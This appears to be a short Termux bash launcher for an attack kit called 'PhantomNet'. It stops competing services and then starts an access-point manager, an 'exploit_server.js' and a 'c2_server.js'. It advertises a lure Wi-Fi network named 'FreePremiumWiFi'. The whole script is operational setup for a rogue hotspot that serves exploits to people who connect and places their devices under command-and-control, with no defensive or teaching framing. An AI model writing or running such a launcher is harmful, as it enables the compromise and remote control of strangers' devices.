#!/data/data/com.termux/files/usr/bin/bash  
killall dnsmasq php node 2>/dev/null  
core/ap_manager.sh &  
node core/exploit_server.js &  
node core/c2_server.js &  
echo "[+] PhantomNet Active! Connect to 'FreePremiumWiFi'."  
